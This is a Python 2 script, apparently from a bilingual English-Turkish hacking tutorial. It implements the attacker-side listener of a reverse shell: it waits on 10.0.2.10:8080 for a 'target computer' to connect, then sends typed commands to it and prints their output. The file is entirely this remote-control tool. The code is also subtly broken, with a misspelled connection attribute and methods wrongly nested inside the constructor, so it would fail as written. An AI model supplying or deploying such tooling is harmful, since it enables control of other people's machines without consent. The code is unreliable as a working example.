import socket

class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#We specify that we want to use this listener constantly by changing the options of the socket method.--Soket yönteminin seçeneklerini değiştirerek bu dinleyiciyi sürekli kullanmak istediğimizi belirtiyoruz.
        my_listener.bind((ip,port))
        my_listener.listen(0)#We start to listen.-Dinlemeyi başlatıyoruz.
        (self.my_connectionmy_connection, my_address)=my_listener.accept()#If the link comes, we accept it. The statement my_listener.accept returns us a touple, and this touple contains the link and the address of the target computer.Bağlantı gelirse kabul ederiz. My_listener.accept ifadesi bize bir eşleme döndürür ve bu eşleme, hedef bilgisayarın bağlantısını ve adresini içerir.
        print("Connection OK from " + str(my_address))
        
        def command_execution(self, command_input):            
             self.my_connection.send(command_input)#Using the my_connection connection, we send the inputs entered by the user to the target computer.--My_connection bağlantısını kullanarak, kullanıcı tarafından girilen girişleri hedef bilgisayara göndeririz.
             return self.my_connection.recv(1024)#We retrieve the outputs of the commands executed on the target computer with the recv method.--Recv yöntemi ile hedef bilgisayarda çalıştırılan komutların çıktılarını alıyoruz.
    
        def start_listener(self):
            while True: 
                command_input = raw_input("Enter the command: ")#We create a variable using the input method to receive commands from the user.--Kullanıcıdan komut almak için input yöntemini kullanarak bir değişken oluşturuyoruz.(raw_input for python2)
                command_output = self.command_execution(command_input)
                print(command_output)
            
            
new_socket_listener= SocketListener("10.0.2.10", 8080)
new_socket_listener.start_listener()